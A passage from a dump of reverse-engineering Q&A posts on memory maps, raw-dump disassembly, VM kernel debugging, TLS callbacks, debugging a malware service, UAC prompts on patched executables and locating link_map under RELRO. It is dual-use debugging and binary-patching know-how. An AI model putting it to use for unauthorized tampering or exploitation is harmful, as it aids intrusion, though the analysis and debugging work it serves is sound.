16-xxx  encrypted binary plist data
</code></pre>

<p>There may be multiple records stored in a file consecutively.</p>

<p>Similar approach AppKit framework is using to decipher the <code>data.data</code> file. The most relevant code base to look at is the <code>+[NSPersistentUIRecord parseOneRecordFromReadBlock:withDecryptionKeys:]</code> block which parses each record in the <code>data.data</code> file.</p>
","11765"
"How does Ollydbg obtain the memory map (alt+m)?","1427","","<p>I've been looking for any Windows functions to view or dump memory, or the process to do this manually. I can not find info on this anywhere online.</p>

<p>How would I get a dump of a process's memory like the one in Olly's memory window?</p>

<p><strong>Edit for clarification:</strong></p>

<p>I wanted to be able to retrieve an address's base page address. The memory map was the best relation I had to this, as it gives page info such as size, starting address, permissions, etc. <code>VirtualQueryEx()</code> solved the problem.</p>

<p>I ended up iterating through the pages until I found one in which my target address fell.</p>

<p>I tend to ask for what I think would be the solution rather than laying out my problem and taking suggestions. </p>

<p>Thank you all for the help.</p>

<pre><code>// Iterate through pages
for(base = NULL; 
    WINDOWS::VirtualQuery(base, info, sizeof(*info)) == sizeof(*info); 
    base += info-&gt;RegionSize) {

    if(p &gt; base &amp;&amp; p &lt; base + info-&gt;RegionSize) {
        found = true;
        break;
    }
}
</code></pre>
","<p><a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/aa366907%28v=vs.85%29.aspx""><code>VirtualQueryEx()</code></a> can be used to scan through the user-mode address space of a process to enumerate each memory allocation, and PE headers of images in memory can be parsed to determine which memory blocks are associated with which PE sections. PE headers for DLLs also contain the DLLs' names.</p>
","3916"
"How to retrieve assembly from a raw memory dump?","1423","","<p>I have a running memory dump saved as a raw binary file.  This isn't a standalone executable - it's literally just a snapshot of running memory.</p>

<p>I'm looking for a tool that will help me identify assembly instructions within this binary file.  Does such a tool exist?  </p>

<p>I know you can use OllyDebug or IDAPRO to analyze executables.  However, since this is a full memory dump, it'a not clear to me whether these tools are still applicable.  For a raw memory dump there isn't a clear entry point that IDA can start with.</p>

<p>Any suggestions would be very helpful.  Thanks!</p>
","<h2>Disassembling</h2>

<p>You can disassemble in WinDbg at any memory address, e.g.</p>

<pre><code>0:067&gt; db 000007fe`ff4d0000
000007fe`ff4d0000  4d 5a 90 00 03 00 00 00-04 00 00 00 ff ff 00 00  MZ..............
000007fe`ff4d0010  b8 00 00 00 00 00 00 00-40 00 00 00 00 00 00 00  ........@.......
000007fe`ff4d0020  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
000007fe`ff4d0030  00 00 00 00 00 00 00 00-00 00 00 00 e0 00 00 00  ................
000007fe`ff4d0040  0e 1f ba 0e 00 b4 09 cd-21 b8 01 4c cd 21 54 68  ........!..L.!Th
000007fe`ff4d0050  69 73 20 70 72 6f 67 72-61 6d 20 63 61 6e 6e 6f  is program canno
000007fe`ff4d0060  74 20 62 65 20 72 75 6e-20 69 6e 20 44 4f 53 20  t be run in DOS 
000007fe`ff4d0070  6d 6f 64 65 2e 0d 0d 0a-24 00 00 00 00 00 00 00  mode....$.......

0:067&gt; u 000007fe`ff4d0000 L1
advapi32!WmipBuildReceiveNotification &lt;PERF&gt; (advapi32+0x0):
000007fe`ff4d0000 4d5a            pop     r10
</code></pre>

<p>But as you can see, this is more or less useless (in my example useless to disassemble the <code>MZ</code> magic bytes of a DLL's header).</p>

<p>So, finding the right starting place for a disassembly is the critical part.</p>

<h2>Finding code as part of DLLs</h2>

<p>Code should mainly be in DLLs or EXEs (called images or modules in WinDbg). To find them in a memory dump (kernel or user mode), you can run the WinDbg command</p>

<pre><code>.imgscan
</code></pre>

<p>From WinDbg help:</p>

<blockquote>
  <p>The .imgscan command scans virtual memory for image headers.</p>
  
  <p>The .imgscan command displays any image headers that it finds and the header type. Header types include Portable Executable (PE) headers and Microsoft MS-DOS MZ headers.</p>
</blockquote>

<p>I was able to verify this in user mode, but with the only Windows XP kernel mode dump I currently have, it does not output anything.</p>

<p>Example output from a user mode dump:</p>

<pre><code>MZ at 000007fe`ff4d0000, prot 00000004, type 00020000 - size db000
  Name: ADVAPI32.dll
</code></pre>

<p>So all the necessary information to get the DLL is available. In case of a user mode dump I have used</p>

<pre><code>.writemem &lt;FileName&gt; &lt;Range&gt;
</code></pre>

<p>to write the DLL to disk and analyze later. This probably won't work for kernel mode dumps because parts of the module may have been swapped to disk, so the DLL in memory is no longer complete.</p>

<p>This approach will also not find code that was generated on the fly.</p>

<h2>Finding potentially executable code</h2>

<p>Code that can be executed must reside in a memory block that has the <code>executable</code> flag set.</p>

<p>Unfortunately the command</p>

<pre><code>!address -f:&lt;filter&gt;
</code></pre>

<p>is broken in WinDbg 6.2.9200. It should work in user mode dumps and output a list of start and end addresses that are executable.</p>

<p>At the moment I only get</p>

<pre><code>0:067&gt; !address -f:PAGE_EXECUTE

        BaseAddress      EndAddress+1        RegionSize     Type       State                 Protect             Usage
------------------------------------------------------------------------------------------------------------------------

0:067&gt; !address -f:PAGE_EXECUTE_READ
Invalid filter arguments. Type !address -? to get the list of supported parameters
0:067&gt; !address -f:PAGE_EXECUTE_READWRITE
Invalid filter arguments. Type !address -? to get the list of supported parameters
0:067&gt; !address -f:PAGE_EXECUTE_WRITECOPY
Invalid filter arguments. Type !address -? to get the list of supported parameters
</code></pre>

<p>Although I have a full memory dump</p>

<pre><code>0:067&gt; .dumpdebug
...
Flags           40002
                0002 MiniDumpWithFullMemory
                40000 MiniDumpWithTokenInformation
</code></pre>

<p>But you get the idea and might be able to apply it to other tools.</p>
","8962"
"Is it possible to debug an ELF file with a Windows-based disassembler?","1423","","<p><strong>Problem :</strong> How can I debug an ELF file in MS Windows? is it possible?</p>

<p><strong>Scenario :</strong></p>

<p>I have an ELF file compiled to work on hardware with VXWorks 5.5 OS and SH4 CPU. IDA68 is able to disassemble the file and correctly detects SH4 instructions although looks like IDA is unable to debug it with its debugger(the debugger icon is grey), and without the ability to debug the assembly it is almost impossible to understand.</p>

<p>Am I missing something here?</p>
","<p>ELF files can be debugged using IDA debugger if you have the same CPU and OS that were used to build them, installed locally or have them in a remote machine.</p>

<p>In case you don't, you're still able to debug the file but only if the compiler have debugging data in  <a href=""https://en.m.wikipedia.org/wiki/DWARF"" rel=""nofollow noreferrer"">DWARF</a> standard included in the file.</p>

<p>Another option that SVS suggest me, is to set up an emulator with OS and Arctitecture you need trace the file over there which is a good practical way I believe.</p>

<p>Not all ELF files have DWARF debugging data. Particularly, those that are not suppose to be reverse engineered.</p>
","14809"
"Debugging Virtual Machine using Windbg","1422","","<p>I am trying to connect to a Windows XP Professional Virtual Machine running under Microsoft Virtual PC for debugging purposes.
I was following the <a href=""http://msdn.microsoft.com/en-us/library/windows/hardware/ff538143%28v=vs.85%29.aspx"" rel=""nofollow"">MSDN kernel mode debugging article</a>, however bcdedit command was not being recognized on the guest machine so I added the following entry in the boot.ini file under C:\ drive</p>

<pre><code>multi(0)disk(0)rdisk(0)partition(1)\WINDOWS=""KD"" /fastdetect /debug /debugport=2 /baudrate=115200
</code></pre>

<p>I configured the com2 port to a named pipe (\\.\pipe\pipe2)</p>

<p>I enter the following command at the command prompt and turned on the virtual machine</p>

<pre><code>windbg -k com:pipe,port=\\.\pipe\Pipe2,resets=0,reconnect
</code></pre>

<p>and I get the following output</p>

<pre><code>Microsoft (R) Windows Debugger Version 6.12.0002.633 X86
Copyright (c) Microsoft Corporation. All rights reserved.

Waiting for pipe \\.\pipe\pipe2
Waiting to reconnect...
Connected to Windows XP 2600 x86 compatible target at (Fri May  9 05:34:23.920 2014 (UTC + 5:30)), ptr64 FALSE
Kernel Debugger connection established.
Symbol search path is: C:\Windows\Symbols;srv*C:\Windows\Symbols*http://msdl.microsoft.com/download/symbols
Executable search path is: 
Windows XP Kernel Version 2600 UP Free x86 compatible
Built by: 2600.xpsp_sp3_qfe.100216-1510
Machine Name:
Kernel base = 0x804d7000 PsLoadedModuleList = 0x8055b1c0
System Uptime: not available
56: ERROR: UMRxReadDWORDFromTheRegistry/ZwQueryValueKey: NtStatus = c0000034
ERROR: DavReadRegistryValues/RegQueryValueExW(4). WStatus = 127
ERROR: DavReadRegistryValues/RegQueryValueExW(5). WStatus = 127
ERROR: DavReadRegistryValues/RegQueryValueExW(6). WStatus = 127
</code></pre>

<p>The status bar at the bottom says 'Debugee not connected'</p>

<p>Am I missing something?</p>
","<p>It has been a while since I've used Virtual PC, but I remember the instructions in this guide worked well: <a href=""http://silverstr.ufies.org/lotr0/windbg-vmware.html"">http://silverstr.ufies.org/lotr0/windbg-vmware.html</a></p>

<p>However, Virtual PC is extremely outdated (7 years old) and it's much easier nowadays to do VM kernel debugging with <a href=""http://virtualkd.sysprogs.org/"">VirtualKD</a> along with VMware or VirtualBox.</p>
","4299"
"OllyDBG causes executables saved by it to ask for administrator privileges when run","1416","","<p>Whenever I save an executable in OllyDBG (Right-click, Copy to executable, All modifications then Save File), the saved executable asks for administrator privileges when I run it.</p>

<p>I tried opening OllyDBG as a regular user and then saving the file, but no luck. I also tried manipulating the file's permissions, but no luck either.</p>

<p>Is there a way to save a file so that regular users can run it?</p>
","<p>UAC has certain heuristics that will cause a file to request elevation unless a manifest exists that states otherwise. Such heuristics include files that seem to be setup programs for some software. But there are more heuristics and other situations where elevation is assumed to be required.</p>

<p>If the executable has no manifest, you need to add one. Otherwise you may have to modify the existing one.</p>

<p>You can tell by loading it into a resource editor or resource viewer such as:</p>

<ul>
<li><a href=""http://www.angusj.com/resourcehacker/"" rel=""nofollow noreferrer"">http://www.angusj.com/resourcehacker/</a></li>
<li><a href=""http://www.resedit.net/"" rel=""nofollow noreferrer"">http://www.resedit.net/</a></li>
</ul>

<p>... and so on. Check out the answers to this question: <a href=""https://reverseengineering.stackexchange.com/q/2319"">Freely available resource hacking applications</a> ...</p>

<h3>Workarounds are:</h3>

<ul>
<li>this can be done by setting the value <code>level=""asInvoker""</code> in element <code>requestedExecutionLevel</code> of the manifest (see <a href=""https://superuser.com/questions/24631/prevent-elevation-uac-for-an-application-that-doesnt-need-it"">here</a> and more generally <a href=""http://msdn.microsoft.com/en-us/library/aa905330.aspx"" rel=""nofollow noreferrer"">here</a> and <a href=""http://www.codeproject.com/Articles/17968/Making-Your-Application-UAC-Aware"" rel=""nofollow noreferrer"">here</a>)</li>
<li>or if you don't have the requirement that the file be saved and can instead provide a script to launch it, you can set an environment variable (<code>set __COMPAT_LAYER=RUNASINVOKER</code>) as explained <a href=""https://superuser.com/a/450503"">here</a></li>
</ul>

<p>Unfortunately this is somewhat of a science to get right.</p>
","4389"
"How to find which function called the one currently being executed in IDA?","1415","","<p>I have breakpoint in function 'A', but 'A' can be called by functions 'B' and 'C'. When a breakpoint is hit, i'd like to know what called 'A' in the first place. Is there something like a function call stack?</p>

<p>I have found 'debugger->tracing->stack trace' option, but when i press it after breakpoint is hit, it only shows this, which doesnt make any sense:
<img src=""https://i.stack.imgur.com/pHQbr.png"" alt=""enter image description here""></p>
","<p>Do a function tracing like this:</p>

<ol>
<li>set a breakpoint at the main function and at your target function</li>
<li>start debugging</li>
<li>when the process is halted: Go to Debugger->Tracing->Function Tracing</li>
<li>continue Process</li>
<li>once the process is halted again, go to Debugger->Tracing->Tracing Window and check for the info you need.</li>
</ol>

<p>If this does not give you the needed info try basic block or instruction tracing. This will work even if there is a problem with identifying functions / the stack frame ...</p>

<p>More info on the tracing feature can be found here: <a href=""https://www.hex-rays.com/products/ida/support/tutorials/tracing.pdf"" rel=""nofollow"">hex-rays tutorial on tracing</a></p>
","8331"
"Debugging EXE with TLS","1412","","<p>How do I debug an executable that uses TLS callbacks?  It's my understanding that these run before my debugger will attach.</p>
","<p>either:</p>

<ul>
<li>patch a debug break (CC int3) or an infinite loop (EB FE jmp $) at the start of the TLS</li>
<li>try to set a breakpoint as early as possible (like OllyDbg's Options/Events/Make first pause at/System Breakpoint), then set a breakpoint at the TLS' starts</li>
<li>use a specific plugin, such as OllyAdvanced for OllyDbg.</li>
</ul>

<p>Note that the conditions for TLS execution are <a href=""http://code.google.com/p/corkami/wiki/PE?show=content#TLS"">tricky</a>, and debugging might cause an otherwise ignored TLS to be executed.</p>
","1402"
"Red addresses in IDA Pro","1407","","<p>I know that red addresses means, that code do not recognize as a function in IDA, because that code never get called.
But I have found a piece of code that is marked red, but when debugging, I saw that this code gets called. But I still can't get that graph view of that piece of code and it still marked red.
Can someone please explain what's happening here..?</p>
","<p>To make IDA recognize the code as a procedure, press <kbd>P</kbd> at the start of it.</p>

<p>Ida ""<em>automatically presses the <kbd>P</kbd> key</em>"" if it sees a direct call to that address. However, if the source code was C++ or another language with classes, the function might never be called directly, only indirectly through the vtable (table of method start addresses) of the class. In this case, you'll have to mark the procedure manually.</p>
","9412"
"DOS program debug in IDA?","1406","","<p>Does anybody know something hack to debug 16bit DOS program in IDA 6.1?</p>
","<p><a href=""https://github.com/wjp/idados"">IDA DOSBox plugin</a> by Eric Fry.</p>

<p>Note that it requires a modified DOSBox build.</p>
","3767"
"Setting an IDA function pointer in a struct via script","1402","","<p>The ordinary, manual way of redefining a <code>struct</code> member to become a function pointer would be to press on it, hit '<kbd>Y</kbd>', and enter the proper declaration in the popup box. For example, for <code>struct</code> member <code>fncQuery</code>, I would change the string to: <code>BOOL (__cdecl *fncQuery)(char *cmdID)</code></p>

<p>This would be helpful; When I next identify a call to this function pointer, I would mark the appropriate <code>call [reg+offset]</code> line as this function pointer, and IDA will re-analyze and comment the parameters for me.</p>

<p>I have a thousand <code>struct</code> each with at least one such function pointer member, and corresponding lists of the descriptions of these functions' parameters and return values. Understandably, I want to match them up by an IDAPython script rather than by hand. However, I can't find an equivalent for the '<kbd>Y</kbd>' button for scripts:</p>

<ul>
<li><p><code>AddStrucMember</code> does not cut it as far as I know - I can declare a member to become a pointer to a <code>struct</code> by giving it a <code>structID</code>, but that's not what I need.</p></li>
<li><p><code>SetMemberType</code> is the same as the previous.</p></li>
<li><p><code>SetType</code> requires a linear address and a type string - which would be perfect except linear addresses are exclusive to the code section, so I can't touch structure member definitions with <code>SetType</code>.</p></li>
</ul>

<p>In my search I've found someone who conjured up dark magic, incorporating low level <code>idaapi</code> into his IDAPython script, to detect if a <code>struct</code> member has the same name as a known function, and if it does, ""<em>gets</em>"" the type of that function and ""<em>sets</em>"" it onto the member. Specifically, such horrible calls are seen (taken out of context of its definitions, you'll have to trust me when I say this runs properly and the first function call fills up its many outparameters with meaningful values):</p>

<pre><code>get_named_type = g_dll.get_named_type
get_named_type.argtypes = [
  ctypes.c_void_p, #const til_t *ti,
  ctypes.c_char_p, #const char *name,
  ctypes.c_int, #int ntf_flags,
  ctypes.POINTER(ctypes.POINTER(ctypes.c_ubyte)), #const type_t **type=NULL,
  ctypes.POINTER(ctypes.POINTER(ctypes.c_ubyte)), #const p_list **fields=NULL,
  ctypes.POINTER(ctypes.POINTER(ctypes.c_ubyte)), #const char **cmt=NULL,
  ctypes.POINTER(ctypes.POINTER(ctypes.c_ubyte)), #const p_list **fieldcmts=NULL,
  ctypes.POINTER(ctypes.c_ulong), #sclass_t *sclass=NULL,
  ctypes.POINTER(ctypes.c_ulong), #uint32 *value=NULL);
]

get_named_type(
            til,
            funcname,
            idaapi.NTF_SYMM,
            ctypes.byref(typ_type),
            ctypes.byref(typ_fields),
            ctypes.byref(typ_cmt),
            ctypes.byref(typ_fieldcmts),
            ctypes.byref(typ_sclass),
            ctypes.byref(value)
type_arr = ctypes.create_string_buffer(0x400)
            type_arr[0] = chr(idaapi.BT_PTR)
            manualTypeCopy(type_arr, 1, len(type_arr), typ_type)
            ret = g_dll.set_member_tinfo(
                til,
                struc,
                memb,
                ctypes.c_uint(0),
                type_arr,
                typ_fields,
                ctypes.c_uint(0),
            )
</code></pre>

<p>The work behind the scenes on ""<code>get_named_type</code>"" eludes me, and looking into its source (and fashioning something from it for my use) may be strong headed and premature.</p>

<p>Do you know of an easier way my need can be fulfilled ? I just need to define structure members as function pointers from an IDAPython script. Please help !</p>
","<p>The <kbd>Y</kbd> key equivalent is indeed the <code>SetType</code> (or, rather, <code>ApplyType</code>) function, and it normally accepts addresses. However, you actually can pass the structure member ID as the ""address"" to set the member's type info.</p>
","4755"
"ELF link_map when linked as RELRO","1399","","<p>When linking a binary with <code>-Wl,-z,relro,-z,now</code>, all relocations are performed at start-up before passing control to the binary.</p>

<p>Because of this, there is no need for the <code>.got.plt</code> segment.  Normally, a pointer to the linker's <code>link_map</code> structure is stored in this segment.</p>

<p>When compiled with full RELRO, where, if anywhere, can a copy of the <code>link_map</code> be obtained without consulting other loaded libraries, or <code>libdl</code>?</p>

<p>The place one would expect it to be -- in the segment marked with the tag <code>DT_PLTGOT</code> -- it does not appear.  Instead, there's just a link back to Program Header of type <code>PT_DYNAMIC</code>.  The slot in the segment marked <code>DT_GOTPLT</code> starts with the offset of the <code>DYNAMIC</code> section, and does not contain any pointers to the link map.</p>

<p>Headers</p>

<pre><code>$ readelf -a amd64-pwntest-relro | egrep -i '(_dynamic|pltgot)'
 0x0000000000000003 (PLTGOT)             0x202eb8
    48: 0000000000202ca8     0 OBJECT  LOCAL  DEFAULT   21 _DYNAMIC
</code></pre>

<p>Binary is RELRO</p>

<pre><code>$ checksec.sh --file amd64-relro
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Full RELRO      No canary found   NX disabled   PIE enabled     No RPATH   No RUNPATH   amd64-relro
</code></pre>

<p>GDB shows that the data at the specified offset, at runtime, does not contain a link map pointer.</p>

<pre><code>$ gdb ./amd64-relro
gdb-peda$ start
gdb-peda$ vmmap relro
Start              End                Perm      Name
0x0000555555554000 0x0000555555556000 r-xp      /home/user/pwntools-regression/src/amd64-relro
0x0000555555756000 0x0000555555757000 r-xp      /home/user/pwntools-regression/src/amd64-relro
0x0000555555757000 0x0000555555758000 rwxp      /home/user/pwntools-regression/src/amd64-relro
gdb-peda$ telescope 0x0000555555554000+0x202eb8 5
00:0000|  0x555555756eb8 --&gt; 0x202ca8 
01:0008|  0x555555756ec0 --&gt; 0x0 
02:0016|  0x555555756ec8 --&gt; 0x0 
03:0024|  0x555555756ed0 --&gt; 0x7ffff7675870 (&lt;__GI___libc_free&gt;:        mov    rax,QWORD PTR [rip+0x33b671]        # 0x7ffff79b0ee8)
04:0032|  0x555555756ed8 --&gt; 0x7ffff79c0430 (&lt;__pthread_create_2_1&gt;:    push   rbp)
</code></pre>
","<p>If the binary has a <code>DT_DEBUG</code> entry in the <code>PT_DYNAMIC</code> area, it will be filled with a pointer to the <code>r_debug</code> symbol in the dynamic linker.</p>

<pre><code>test:00007F17ED7DDDB0 Elf64_Dyn &lt;DT_SYMENT, 18h&gt;
test:00007F17ED7DDDB0 Elf64_Dyn &lt;DT_DEBUG, offset _r_debug&gt;
test:00007F17ED7DDDB0 Elf64_Dyn &lt;DT_PLTGOT, offset _GLOBAL_OFFSET_TABLE_&gt;
</code></pre>

<p>The second field in <code>r_debug</code> is the pointer to <code>link_map</code>:</p>

<pre><code>debug001:00007F17ED5DC1A0 _r_debug dd 1                                    ; r_version
debug001:00007F17ED5DC1A0 db 0, 0, 0, 0
debug001:00007F17ED5DC1A0 dq offset _link_map_head                ; r_map
debug001:00007F17ED5DC1A0 dq offset _dl_debug_state               ; r_brk
debug001:00007F17ED5DC1A0 dd RT_ADD                               ; r_state
debug001:00007F17ED5DC1A0 db 0, 0, 0, 0
debug001:00007F17ED5DC1A0 dq 7F17ED3B8000h                        ; r_ldbase
</code></pre>
","6526"
"IDA PRO Hex-Rays 1.5 pseudo code understanding -=0x3FFFFFFFu; += 0x3FFFFFFFu;","1399","","<p>I'm trying to clean up the pseudo code to make it compile and function similar if not exactly the same as the original code.</p>

<p>This bit which looks like this appears in various places I'm trying to figure out what it exactly means.</p>

<pre><code>  if ( ZonePlayerCount &gt; 0 )
  {
    v3 = 0;
    v4 = 0;
    v5 = playerPointerList;
    v6 = &amp;playerPointerList[1];
    do
    {
      if ( *(unsigned int *)&amp;(*v5)-&gt;IPAddressDWORD.S_un.S_un_b.s_b1 == IPAddress &amp;&amp; (*v5)-&gt;Port == Port )
      {
        printf(""Connection is broken because same ip/port requested another connection\n"");
        sub_41CBD0((int)&amp;(*v5)-&gt;encryptionPointer-&gt;ConnectionStatus);
        Memory = *v5;
        if ( *v5 )
        {
          DisconnectUser(*v5);
          free(Memory);
        }
        --ZonePlayerCount;
        memcpy(v5, v6, 4 * (v4 + ZonePlayerCount));
        --v3;
        v4 -= 0x3FFFFFFFu;
        v6 = (char *)v6 - 4;
        --v5;
      }
      ++v3;
      v4 += 0x3FFFFFFFu;
      v6 = (char *)v6 + 4;
      ++v5;
    }
    while ( v3 &lt; ZonePlayerCount );
  }
</code></pre>

<p>Other places like this..</p>

<pre><code>    v1 = 0;
    if ( ArenaArrayLength &gt; v1 )
    {
      v18 = 0;
      v19 = Arenas;
      v20 = &amp;Arenas[1];
      do
      {
        if ( ProcessArena(*v19) )
        {
          if ( (*v19)-&gt;ArenaName[0] )
            WriteSubGameLog(""Private arena dropped: %s\n"", (*v19)-&gt;ArenaName);
          else
            WriteSubGameLog(""Arena dropped\n"");
          bufa = *v19;
          if ( *v19 )
          {
            ShutdownArena(*v19);
            free(bufa);
          }
          --ArenaArrayLength;
          memcpy(v19, v20, 4 * (v18 + ArenaArrayLength));
          --v1;
          v18 -= 0x3FFFFFFFu;
          v20 = (char *)v20 - 4;
          --v19;
        }
        ++v1;
        v18 += 0x3FFFFFFFu;
        v20 = (char *)v20 + 4;
        ++v19;
      }
      while ( v1 &lt; ArenaArrayLength );
    }
</code></pre>

<p>Assembly for the first piece of pseudo code I provide here.</p>

<pre><code>.text:00412D7B                 mov     esi, offset playerPointerList
.text:00412D80                 mov     ebx, (offset playerPointerList+4)
.text:00412D85
.text:00412D85 loc_412D85:                             ; CODE XREF: NewConnectionRequest+C0j
.text:00412D85                 mov     eax, [esi]
.text:00412D87                 mov     ecx, [esp+20h+IPAddress]
.text:00412D8B                 cmp     [eax+2F3h], ecx
.text:00412D91                 jnz     short loc_412DFC
.text:00412D93                 mov     dx, [esp+20h+Port]
.text:00412D98                 cmp     [eax+2F7h], dx
.text:00412D9F                 jnz     short loc_412DFC
.text:00412DA1                 push    offset aConnectionIsBrok ; ""Connection is broken because same ip/port ""...
.text:00412DA6                 call    _printf
.text:00412DAB                 mov     eax, [esi]
.text:00412DAD                 add     esp, 4
.text:00412DB0                 mov     ecx, [eax+28h]
.text:00412DB3                 call    sub_41CBD0
.text:00412DB8                 mov     ecx, [esi]      ; player
.text:00412DBA                 test    ecx, ecx
.text:00412DBC                 mov     [esp+20h+Memory], ecx
.text:00412DC0                 jz      short loc_412DD4
.text:00412DC2                 call    DisconnectUser
.text:00412DC7                 mov     ecx, [esp+20h+Memory]
.text:00412DCB                 push    ecx             ; Memory
.text:00412DCC                 call    ??3@YAXPAX@Z    ; operator delete(void *)
.text:00412DD1                 add     esp, 4
.text:00412DD4
.text:00412DD4 loc_412DD4:                             ; CODE XREF: NewConnectionRequest+70j
.text:00412DD4                 mov     eax, ZonePlayerCount
.text:00412DD9                 dec     eax
.text:00412DDA                 mov     ZonePlayerCount, eax
.text:00412DDF                 add     eax, edi
.text:00412DE1                 shl     eax, 2
.text:00412DE4                 push    eax             ; Size
.text:00412DE5                 push    ebx             ; Src
.text:00412DE6                 push    esi             ; Dst
.text:00412DE7                 call    _memcpy
.text:00412DEC                 add     esp, 0Ch
.text:00412DEF                 dec     ebp
.text:00412DF0                 sub     edi, 3FFFFFFFh
.text:00412DF6                 sub     ebx, 4
.text:00412DF9                 sub     esi, 4
.text:00412DFC
.text:00412DFC loc_412DFC:                             ; CODE XREF: NewConnectionRequest+41j
.text:00412DFC                                         ; NewConnectionRequest+4Fj
.text:00412DFC                 mov     eax, ZonePlayerCount
.text:00412E01                 inc     ebp
.text:00412E02                 add     edi, 3FFFFFFFh
.text:00412E08                 add     ebx, 4
.text:00412E0B                 add     esi, 4
.text:00412E0E                 cmp     ebp, eax
.text:00412E10                 jl      loc_412D85
</code></pre>

<p>As far as I understand it is that the <code>0x3FFFFFFF</code> has something to do with the bounds of the array?</p>

<p>I think after the DisconnectUser and free of memory all the playerPointer pointers get shifted to the left is that correct? or it just changes the counter in different paths.</p>

<p>I think the counter is either <code>v3</code> can keep increasing while the loop is going but when a player gets removed it starts checking from the end of the list or something?</p>
","<p>I think it should look like this I am 99.9% feel it's a element shifter something tells me that <code>0x3FFFFFFF</code> is max bounds of a array so it's some compiler thing that it appends to make sure it gets the end of the array.</p>

<p>I was wrong <code>0x3FFFFFFF</code> is used to create signed numbers to emulate subtracting by adding. See comment by DCoder</p>

<pre><code>  if ( ZonePlayerCount &gt; 0 )
  {
    v3 = 0;

    do
    {
      if ( playerPointerList[v3].IPAddressDWORD.S_un.S_un_b.s_b1 == IPAddress &amp;&amp; playerPointerList[v3].Port == Port )
      {
        printf(""Connection is broken because same ip/port requested another connection\n"");
        sub_41CBD0((int)&amp;playerPointerList[v3].encryptionPointer-&gt;ConnectionStatus);
        Memory = *v5;
        if ( *v5 )
        {
          DisconnectUser(*v5);
          free(Memory);
        }

        memcpy(&amp;playerPointerList[v3], &amp;playerPointerList[v3 + 1], 4 * (ZonePlayerCount - v3 - 1));
        //or
        memmove(&amp;playerPointerList[v3], &amp;playerPointerList[v3 + 1], (ZonePlayerCount - v3 - 1) * sizeof(&amp;playerPointerList));
        --ZonePlayerCount;
        --v3;
      }
      ++v3;
    }
    while ( v3 &lt; ZonePlayerCount );
  }
</code></pre>

<p>Let me know if this is wrong, I'll remove the answer. (don't have original source code to compare against).</p>

<p>Thought I shouldn't be using <code>memcpy</code> because it may leave junk in memory at the very end but i think that junk does no harm and eventually will be replaced with something useful when the time comes.</p>

<p>Although it does seem <code>memmove()</code> is better suited here.</p>
","6272"
"Reversing a Windows service","1395","","<p>I am trying to reverse engineer a malware that open a windows service dynamically in OllyDbg. 
When the malware calls <code>StartServiceCtrDispatcherW</code>,  I receive an error: 
<a href=""https://i.stack.imgur.com/RiD6y.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/RiD6y.png"" alt=""enter image description here""></a></p>

<p>How I can continue to analyze this malware dynamically?</p>

<p>Note: I already used <code>Image File Execution Options</code></p>
","<p>If you want to debug the service initialization and it happens automatically (not triggered by some action you perform), you probably can't do it on any Windows newer than XP with ollydbg. You'll have to use WinDbg.</p>

<p>You need to set IFEO Debugger for your process name to run CDB <strong>as server</strong> (e.g. <code>cdb.exe -server tcp:port=12345 -noio</code>) and the run WinDbg as a client and connect to your server (<code>windbg.exe -remote tcp:server=localhost,port=12345</code>).</p>

<p>You'll probably want to change the <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ServicesPipeTimeout</code> Registry value to be a bit longer. This is the time the SCM waits for a service it runs to talk to it.</p>

<p>If you don't have to debug the initialization you can simply attach to the service after it starts, and then you can use ollydbg.</p>

<p>All of this and pretty much everything you need to know is documented under the MSDN page titled <a href=""https://msdn.microsoft.com/en-us/library/windows/hardware/ff540613(v=vs.85).aspx"" rel=""nofollow noreferrer"">Debugging a Service Application</a>.</p>

<hr />

<p><em>Edit:</em> If patching the binary is possible you can add an infinite loop in the entry point like <a href=""https://reverseengineering.stackexchange.com/users/1876/gandolf"">gandolf</a> suggested and then attach a debugger after you log in.</p>

<p>Or, if the binary doesn't do any SEH tricks that interfere with it: Add an exception to the entry point (0xCC - int 3 is the obvious choice), set <code>AeDebug</code> to a long running process (such as <code>notepad.exe</code>) and then attach a debugger. This is what <a href=""http://rads.stackoverflow.com/amzn/click/0735662789"" rel=""nofollow noreferrer"">Inside Windows Debugging</a> proposes (p. 139).</p>

<p>Or, what's even easier and makes even more sense: Add the same INT3, and set <code>AeDebug</code> to the same <code>cdb.exe</code> command-line as you would put in IFEO and connect WinDbg to it after you log in.</p>
","11385"
"IDA Xrefs from - how to?","1393","","<p>I want to generate all xrefs from function just to check what api it uses in its call-tree. I know I can generate call tree graph by right clicking on function name and ""Xrefs from"", but I would like to have this functions listed just as text or something like that, so I could read it easily.</p>

<p>Reading it from WinGraph is pretty hard, and I have trouble with this nasty colors..
I mean, how is it readable? It is really hard to read white text on cyan background. And I dont see any way to configure it. My eyes just cant stand looking at it.</p>

<p>So how can I get this xrefs in some friendly format? I am sure it is possible.. 
I am using IDA 6.1 </p>

<p>Thanks in advance</p>
","<p>The <a href=""https://code.google.com/p/mynav/"" rel=""nofollow noreferrer"">MyNav</a> plugin will show you calls from a function recursively, as shown below:
<img src=""https://i.stack.imgur.com/0z5Nh.png"" alt=""enter image description here""></p>
","4281"
"Why is JMP used with CALL?","1391","","<p>I am trying to analyze an old malware sample in OllyDbg. It has instruction of the format <code>CALL &lt;JMP.&amp;KERNEL32.SetUnhandledExceptionFilter&gt;</code></p>

<p>I am not an expert in Assembly. I know that CALL is used to call a sub-routine and JMP is used to jump to a particular address in the memory but what is the result of using CALL with JMP? Could anyone clarify on it? Even pointers to where I could find answers would be very helpful. Thanks.</p>
","<p>Seeing a call in the form <code>CALL &lt;JMP.&amp;KERNEL32.SetUnhandledExceptionFilter&gt;</code> suggests that the binary was compiled with Visual C++'s <strong><a href=""http://msdn.microsoft.com/en-us/library/4khtbfyf%28VS.80%29.aspx"">/INCREMENTAL</a></strong> option, hence the table of jump thunks.</p>

<blockquote>
  <p>... an incrementally linked executable (.exe) file or dynamic-link library (DLL):</p>
  
  <p>...</p>
  
  <ul>
  <li>May contain jump thunks to handle relocation of functions to new addresses.</li>
  </ul>
  
  <p>...</p>
</blockquote>
","2858"
"Any idea how to decode this binary data?","1378","","<p>I have binary data representing a table.</p>

<p>Here's the data when I print it with Python's <a href=""http://docs.python.org/2/library/repr.html#module-repr"">repr()</a>:
